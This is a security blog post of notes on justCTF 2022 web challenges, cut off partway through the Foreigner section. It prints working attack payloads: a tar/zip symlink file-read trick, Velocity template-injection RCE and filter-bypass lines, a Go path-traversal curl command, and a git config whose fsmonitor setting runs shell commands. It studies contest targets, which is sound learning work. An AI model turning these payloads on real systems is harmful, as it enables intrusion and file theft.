<!DOCTYPE html>
<html class="has-navbar-fixed-top" lang="en">
<head>
    <meta charset="utf-8">
<title>justCTF 2022 Notes - Huli&#39;s blog</title>
<meta name="viewport" content="width=device-width, initial-scale=1">



            
<link href="https://blog.huli.tw/2022/06/14/justctf-2022-writeup/" rel="alternate" hreflang="zh-TW" />
            
    




    
<link rel="canonical" href="https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/">
    





    <meta name="description" content="This holiday, there was justCTF and WeCTF, which was all web. I originally wanted to participate in both, so if I got stuck on one, I could switch to the other. However, I got stuck on both XD This">
<meta property="og:type" content="article">
<meta property="og:title" content="justCTF 2022 Notes">
<meta property="og:url" content="https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/index.html">
<meta property="og:site_name" content="Huli&#39;s blog">
<meta property="og:description" content="This holiday, there was justCTF and WeCTF, which was all web. I originally wanted to participate in both, so if I got stuck on one, I could switch to the other. However, I got stuck on both XD This">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://blog.huli.tw/img/justctf-2022-writeup/cover-en.png">
<meta property="article:published_time" content="2022-06-14T14:27:28.000Z">
<meta property="article:modified_time" content="2023-06-20T05:46:56.921Z">
<meta property="article:author" content="Huli">
<meta property="article:tag" content="Security">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://blog.huli.tw/img/justctf-2022-writeup/cover-en.png">



<link rel="alternative" href="/atom.xml" title="justCTF 2022 Notes" type="application/atom+xml">



<link rel="icon" href="/img/lidemy_logo.png">


<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">


<link rel="stylesheet" href="/css/bulma.css?v=2.css">



<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />


<link rel="stylesheet" href="/css/style.css?v=3.css">





    
    
    
    
    
    
    
    
    
    
<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-1393J2EVCZ');
</script>


    


<meta name="generator" content="Hexo 6.3.0"></head>
<body>
    <script>
        if (localStorage.getItem('dark-mode')) {
            if (localStorage.getItem('dark-mode') === 'true') {
                document.body.classList.add('dark-mode')
            }
        } else {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                document.body.classList.add('dark-mode')
            }
        }
    </script>
    
<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
    <div class="container">
        <div class="navbar-brand">
            <a class="navbar-item navbar-logo" href="/en">
                
                    
                    Huli&#39;s blog
                    
                
            </a>
            <div class="navbar-burger">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        
        <div class="navbar-menu navbar-start">
            
            <a class="navbar-item "
               href="/en/archives">Archive</a>
            
            <a class="navbar-item "
               href="/en/categories">Categories</a>
            
            <a class="navbar-item "
               href="/en/about">About</a>
            
        </div>
        
        <div class="navbar-menu navbar-end">
            
            
            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
                <a class="navbar-item" title="Table of Contents">
                    Table of Contents
                </a>
                <div class="navbar-dropdown">
                    
                    
                    
                    
                    <a class="navbar-item" href="#symple-unzipper40-solves">1&nbsp;&nbsp;<b>Symple Unzipper(40 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#velociraptor22-solves">2&nbsp;&nbsp;<b>Velociraptor(22 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#gobucket18-solves">3&nbsp;&nbsp;<b>GoBucket(18 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#gitara12-solves">4&nbsp;&nbsp;<b>gitara(12 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#baby-xsleak7-solves">5&nbsp;&nbsp;<b>Baby XSLeak(7 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#foreigner5-solves">6&nbsp;&nbsp;<b>Foreigner(5 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#web-api-intended4-solves">7&nbsp;&nbsp;<b>Web API intended(4 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#ninja1-solves">8&nbsp;&nbsp;<b>Ninja(1 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#dank-shark0-solves">9&nbsp;&nbsp;<b>Dank Shark(0 solves)</b></a>
                    
                </div>
            </div>
            
            
            <a class="navbar-item" target="_blank" title="Twitter" href="https://twitter.com/aszx87410">
                
                <i class="fab fa-twitter"></i>
                
            </a>
               
            <a class="navbar-item" target="_blank" title="RSS" href="/atom-en.xml">
                
                <i class="fas fa-rss"></i>
                
            </a>
               
            
            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
                <div>
                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
                    <defs>
                    </defs>
                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
                    </g>
                    </svg>
                </div>
            </a>
            
               <a class="navbar-item" href="/2022/06/14/justctf-2022-writeup/">中文</a>
            
            

        </div>
    </div>
</nav>

    <section class="section">
    <div class="container">
      
      <div data-nosnippet class="self-notice">
        If you have any thoughts on my blog or articles and you want to let me know, you can either post a comment below(public) or tell me via this <a href="https://forms.gle/SjJZ4cnNs6NnjXQG8" target="_blank">feedback form</a>
      </div>
      
    <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            justCTF 2022 Notes
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2022-06-14T14:27:28.000Z" itemprop="datePublished">14 June 2022</time>
        </span>
        
        <span class="column is-narrow article-category">
            <i class="far fa-folder"></i>
            <a class="article-category-link" href="/en/categories/Security/">Security</a>
        </span>
        
        
        
        <spen data-nosnippet class="column is-narrow">(Translated by ChatGPT)</span>
        
    </div>
    
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <img src="/img/justctf-2022-writeup/cover.png" style="display:none">

<p>This holiday, there was justCTF and WeCTF, which was all web. I originally wanted to participate in both, so if I got stuck on one, I could switch to the other. However, I got stuck on both XD</p>
<p>This time, justCTF had many good web challenges. As usual, I will write some notes and record some keywords:</p>
<ol>
<li>zip&#x2F;tar symlink</li>
<li>Velocity SSTI</li>
<li>Golang path</li>
<li>git principle</li>
<li>scp principle</li>
<li>xsleak, STTF + <code>:target</code> selector</li>
</ol>
<p>The order below is sorted by the number of solves, with more solves at the top.</p>
<span id="more"></span>

<h2><span id="symple-unzipper40-solves">Symple Unzipper(40 solves)</span></h2><p>The goal of this challenge is to read the <code>flag.txt</code> file in the same directory as the server code.</p>
<p>The core code is as follows:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">ROOT_DIR <span class="token operator">=</span> Path<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>absolute<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>parent
UPLOAD_DIR <span class="token operator">=</span> ROOT_DIR <span class="token operator">/</span> <span class="token string">"uploads"</span>
FLAG_PATH <span class="token operator">=</span> ROOT_DIR <span class="token operator">/</span> <span class="token string">"flag.txt"</span>
SOURCE_PATH <span class="token operator">=</span> ROOT_DIR <span class="token operator">/</span> <span class="token string">"server.tar.gz"</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>post</span><span class="token punctuation">(</span><span class="token string">"/extract"</span><span class="token punctuation">,</span> tags<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"extract"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">extract</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">:</span> UploadFile<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""Extracts the given ZIP and returns a JSON object containing the contents of every file extracted"""</span>
    <span class="token keyword">with</span> TemporaryDirectory<span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token operator">=</span>UPLOAD_DIR<span class="token punctuation">)</span> <span class="token keyword">as</span> tmpdir<span class="token punctuation">:</span>
        file_to_extract <span class="token operator">=</span> Path<span class="token punctuation">(</span>tmpdir<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_to_extract<span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
                data <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span>
                    <span class="token keyword">break</span>
                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        <span class="token comment"># make sure the file is a valid zip because Python's zipfile doesn't support symlinks (no hacking!)</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> is_zipfile<span class="token punctuation">(</span>file_to_extract<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">raise</span> HTTPException<span class="token punctuation">(</span>status_code<span class="token operator">=</span><span class="token number">415</span><span class="token punctuation">,</span> detail<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"The input file must be an ZIP archive."</span></span><span class="token punctuation">)</span>
        <span class="token keyword">with</span> TemporaryDirectory<span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token operator">=</span>tmpdir<span class="token punctuation">)</span> <span class="token keyword">as</span> extract_to_dir<span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                extract_archive<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>file_to_extract<span class="token punctuation">)</span><span class="token punctuation">,</span> outdir<span class="token operator">=</span>extract_to_dir<span class="token punctuation">)</span>
            <span class="token keyword">except</span> PatoolError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
                <span class="token keyword">raise</span> HTTPException<span class="token punctuation">(</span>status_code<span class="token operator">=</span><span class="token number">400</span><span class="token punctuation">,</span> detail<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"Error extracting ZIP </span><span class="token interpolation"><span class="token punctuation">&#123;</span>file_to_extract<span class="token punctuation">.</span>name<span class="token punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token conversion-option punctuation">!s</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> read_files<span class="token punctuation">(</span>extract_to_dir<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>First, use <code>is_zipfile</code> to check if it is a zip file, and then use patool’s <code>extract_archive</code> to decompress the file. From the file name, it seems to be related to symlink. During the competition, I tried to use zip to package symlink files, but it didn’t work. This challenge was later solved by my teammate.</p>
<p>I saw someone post the solution on <a target="_blank" rel="noopener" href="https://discord.com/channels/656258740252704788/978312189159030805/985625416356229160">discord</a>:</p>
<pre class="line-numbers language-none"><code class="language-none">ln -fs ..&#x2F;..&#x2F;..&#x2F;flag.txt .
touch a
zip a.zip -xi a
tar --owner 0 --group 0 -cvf payload.tar flag.txt a.zip

curl -v $&#123;1:-symple-unzipper.web.jctf.pro&#125;&#x2F;extract -F &#39;file&#x3D;@payload.tar&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>From the discussion in discord, it seems that after doing the above, the file header is in tar format, and the end is the zip file you packaged. The implementation of <code>is_zipfile</code> will cause this type of file to pass (it seems to check the magic byte first, and if it cannot be found, it will be judged in other ways), so it is judged as true, and then it will be decompressed by the <code>extract_archive</code> below, and then your symlink will be preserved.</p>
<h2><span id="velociraptor22-solves">Velociraptor(22 solves)</span></h2><p>This challenge is Velocity’s SSTI. If you search online, you will find this RCE payload:</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">#<span class="token function">set</span><span class="token punctuation">(</span>$e<span class="token operator">=</span><span class="token string">"e"</span><span class="token punctuation">)</span>
$e<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"touch /tmp/rai4over"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>But this challenge locked it, so it cannot be used. The flag is in the root directory, so you don’t need RCE, just need to be able to read the file. Velocity has an <code>include</code> command:</p>
<pre class="line-numbers language-none"><code class="language-none">#include( &quot;&#x2F;flag.txt&quot; )<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>But if you use it directly, it will give you an error:</p>
<blockquote>
<p>Malicious input detected (#include, #parse)</p>
</blockquote>
<p>You need to find a way to bypass it. I saw someone do it this way on discord:</p>
<pre class="line-numbers language-none"><code class="language-none">#set($x&#x3D;&quot;#includ&quot;)
#set($y&#x3D;&#39;e(&quot;&#x2F;flag.txt&quot;)&#39;)
#set($a&#x3D;&quot;$x$y&quot;)

#evaluate($a)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>And someone used unicode to bypass it:</p>
<pre class="line-numbers language-none"><code class="language-none">#set($x&#x3D;&quot;#includ\u0065(&#39;&#x2F;flag.txt&#39;)&quot;)
$x<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h2><span id="gobucket18-solves">GoBucket(18 solves)</span></h2><p>The core code of this challenge is as follows:</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go">r<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/files/&#123;bucketId&#125;/&#123;filename&#125;"</span><span class="token punctuation">,</span> handleBucket<span class="token punctuation">)</span>

bucketPath <span class="token operator">:=</span> filepath<span class="token punctuation">.</span><span class="token function">Join</span><span class="token punctuation">(</span><span class="token string">"./buckets/"</span><span class="token punctuation">,</span> bucketId<span class="token punctuation">)</span>
<span class="token comment">// [...]</span>
filePath <span class="token operator">:=</span> filepath<span class="token punctuation">.</span><span class="token function">Join</span><span class="token punctuation">(</span>bucketPath<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>After matching the URL to the <code>bucketId</code> and <code>filename</code>, concatenate the path and get the file. Our goal is the <code>buckets/secret_file</code> file.</p>
<p>The solution is:</p>
<pre class="line-numbers language-none"><code class="language-none">curl --path-as-is &#39;http:&#x2F;&#x2F;gobucket.web.jctf.pro&#x2F;files&#x2F;\&#x2F;secret_file&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>From the discussion, it seems that golang does not turn <code>/\/</code> into <code>///</code> when processing URL matching, so <code>\</code> becomes a parameter, and when constructing a filepath, it can potentially be dangerous as it allows you to skip&#x2F;escape a directory.</p>
<h2><span id="gitara12-solves">gitara(12 solves)</span></h2><p>The code for this challenge is as follows:</p>
<pre class="line-numbers language-none"><code class="language-none"> &lt;?php

if (!isset($_POST[&#39;domain&#39;]) || preg_match(&#39;&#x2F;[^a-z0-9.-]&#x2F;ims&#39;, $_POST[&#39;domain&#39;]) !&#x3D;&#x3D; 0) &#123;
    highlight_file(__FILE__);
&#125; else &#123;
    $dir &#x3D; &#39;&#x2F;tmp&#x2F;gitara&#39;.rand();
    mkdir($dir);
    system(&quot; \
cd $dir &amp;&amp; \
timeout 2s sshpass -phunter2 scp -o StrictHostKeyChecking&#x3D;no &#39;justctf-gitara@$_POST[domain]:*&#39; . &amp;&amp; \
timeout 1m git status; \
rm -rf $dir&quot;);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The goal is actually quite clear: the chall server will use scp to copy files from your server and then execute <code>git status</code>, so you need to use some of git’s features to achieve RCE.</p>
<p>At the time, a teammate posted this config:</p>
<pre class="line-numbers language-none"><code class="language-none">[core]
    repositoryformatversion &#x3D; 0
    filemode &#x3D; true
    bare &#x3D; false
    logallrefupdates &#x3D; true
    fsmonitor &#x3D; &quot;echo \&quot;Pwned as $(id)\&quot;&gt;&amp;2; false&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>There seems to be a fairly complete explanation here: <a target="_blank" rel="noopener" href="https://github.com/justinsteven/advisories/blob/main/2022_git_buried_bare_repos_and_fsmonitor_various_abuses.md">2022_git_buried_bare_repos_and_fsmonitor_various_abuses.md</a>, but it’s a bit long and I haven’t read it yet.</p>
<p>In short, if you replace the gitconfig with the above content and then use <code>git status</code>, the command after fsmonitor will be executed.</p>
<p>However, the difficulty of this challenge is not in this, but in how to throw a git repo onto the chall server.</p>
<p>When you use <code>git init</code>, a <code>.git</code> folder will be added to the directory, which contains:</p>
<ol>
<li>HEAD</li>
<li>config</li>
<li>description</li>
<li>hooks&#x2F;</li>
<li>info&#x2F;</li>
<li>objects&#x2F;</li>
<li>refs&#x2F;</li>
</ol>
<p>However, the command during scp is <code>server:*</code>, so:</p>
<ol>
<li>Hidden files starting with . will not be matched</li>
<li>Folders will not be downloaded because -r is not used</li>
</ol>
<p>After discussing with my teammates for a while, I found that if you adjust the config, you can reduce it to only four files and you don’t need the <code>.git</code> folder:</p>
<pre class="line-numbers language-none"><code class="language-none">[core]
    repositoryformatversion &#x3D; 0
    bare &#x3D; false
    worktree &#x3D; .&#x2F;
    fsmonitor &#x3D; &quot;echo \&quot;Pwned as $(id)\&quot;&gt;&amp;2; false&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The file structure is as follows:</p>
<pre class="line-numbers language-none"><code class="language-none">drwxr-xr-x  6 huli  staff  192  6 14 22:00 .
drwxr-xr-x  3 huli  staff   96  6 14 21:57 ..
-rw-r--r--  1 huli  staff   23  6 14 21:57 HEAD
-rw-r--r--  1 huli  staff  115  6 14 21:59 config
drwxr-xr-x  4 huli  staff  128  6 14 21:57 objects
drwxr-xr-x  4 huli  staff  128  6 14 21:57 refs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Executing <code>git status</code> in the subdirectory will run the fsmonitor command.</p>
<p>However, the objects and refs folders must exist. I tried to replace them with files, but the check failed. Later, I went to look at the git source code to see how it was checked. The relevant code is here:</p>
<p><a target="_blank" rel="noopener" href="https://github.com/git/git/blob/master/setup.c#L341">https://github.com/git/git/blob/master/setup.c#L341</a></p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/*
 * Test if it looks like we're at a git directory.
 * We want to see:
 *
 *  - either an objects/ directory _or_ the proper
 *    GIT_OBJECT_DIRECTORY environment variable
 *  - a refs/ directory
 *  - either a HEAD symlink or a HEAD file that is formatted as
 *    a proper "ref:", or a regular file HEAD that has a properly
 *    formatted sha1 object name.
 */</span>
<span class="token keyword">int</span> <span class="token function">is_git_directory</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>suspect<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token keyword">struct</span> <span class="token class-name">strbuf</span> path <span class="token operator">=</span> STRBUF_INIT<span class="token punctuation">;</span>
	<span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token class-name">size_t</span> len<span class="token punctuation">;</span>

	<span class="token comment">/* Check worktree-related signatures */</span>
	<span class="token function">strbuf_addstr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>path<span class="token punctuation">,</span> suspect<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">strbuf_complete</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>path<span class="token punctuation">,</span> <span class="token char">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">strbuf_addstr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>path<span class="token punctuation">,</span> <span class="token string">"HEAD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">validate_headref</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">goto</span> done<span class="token punctuation">;</span>

	<span class="token function">strbuf_reset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">get_common_dir</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>path<span class="token punctuation">,</span> suspect<span class="token punctuation">)</span><span class="token punctuation">;</span>
	len <span class="token operator">=</span> path<span class="token punctuation">.</span>len<span class="token punctuation">;</span>

	<span class="token comment">/* Check non-worktree-related signatures */</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span>DB_ENVIRONMENT<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">access</span><span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span>DB_ENVIRONMENT<span class="token punctuation">)</span><span class="token punctuation">,</span> X_OK<span class="token punctuation">)</span><span class="token punctuation">)</span>
			<span class="token keyword">goto</span> done<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
		<span class="token function">strbuf_setlen</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>path<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">strbuf_addstr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>path<span class="token punctuation">,</span> <span class="token string">"/objects"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">access</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span>buf<span class="token punctuation">,</span> X_OK<span class="token punctuation">)</span><span class="token punctuation">)</span>
			<span class="token keyword">goto</span> done<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token function">strbuf_setlen</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>path<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">strbuf_addstr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>path<span class="token punctuation">,</span> <span class="token string">"/refs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">access</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span>buf<span class="token punctuation">,</span> X_OK<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">goto</span> done<span class="token punctuation">;</span>

	ret <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
done<span class="token operator">:</span>
	<span class="token function">strbuf_release</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> ret<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>But I didn’t see any clues, and I didn’t solve this challenge.</p>
<p>After the game, I found out that I missed a detail: <code>access(path.buf, X_OK)</code>. Here, only the X of the file is checked, so if you add x to the file using <code>chmod +x</code>, the check can be passed. Therefore, you can successfully build a legal git repo without any folders.</p>
<p>But what I learned from this challenge is not just that. There is also a discussion on <a target="_blank" rel="noopener" href="https://discord.com/channels/656258740252704788/978311401439363112/985624467810189367">discord</a>, where the author thought that the <code>.git</code> file was needed, but <code>:*</code> in scp does not match this file, what should I do?</p>
<p>The answer is: “Change your own server’s scp”, like this:</p>
<pre class="line-numbers language-none"><code class="language-none">root@ip-172-31-28-181:&#x2F;usr&#x2F;bin# cat scp
#!&#x2F;usr&#x2F;bin&#x2F;bash
&#x2F;usr&#x2F;bin&#x2F;scp.orig -f .git HEAD config elf objects refs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>Why does this work? This is related to the principle of scp.</p>
<p>I originally thought that scp was a program that could help you fetch remote files through ssh. Later, I learned that your server also needs to install scp, and scp will communicate with each other as both a server and a client. This means that when I execute <code>scp remote:* .</code> on my machine, it is actually:</p>
<ol>
<li>Local scp executes ssh to connect to remote</li>
<li>Local scp calls remote scp</li>
<li>Remote scp sends the file list to local scp</li>
<li>Local scp fetches the files</li>
</ol>
<p>In short, what files are matched is sent by remote scp using the <code>-f</code> flag, which is not documented. Therefore, we can see that the above solution overwrites scp, so you can decide which files to transfer.</p>
<p>For more detailed introductions, please refer to:</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://goteleport.com/blog/scp-familiar-simple-insecure-slow/">SCP - Familiar, Simple, Insecure, and Slow</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/an_zhenwei/article/details/7951527">粗析openssh 中scp代码逻辑</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/danxi/p/6680549.html">scp源码浅析</a></li>
</ol>
<h2><span id="baby-xsleak7-solves">Baby XSLeak(7 solves)</span></h2><p>This question has an English version, and I’m too lazy to write it in Chinese: <a href="https://blog.huli.tw/2022/06/14/en/justctf-2022-xsleak-writeup/">https://blog.huli.tw/2022/06/14/en/justctf-2022-xsleak-writeup/</a></p>
<p>In short, it uses the <code>onload</code> time of <code>&lt;object&gt;</code> to determine the size of the response. If there is more content, it should take more time to render, and the <code>onload</code> will trigger later.</p>
<h2><span id="foreigner5-solves">Foreigner(5 solves)</span></h2><p>The code is as follows:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">// flag is being set every 5 seconds</span>
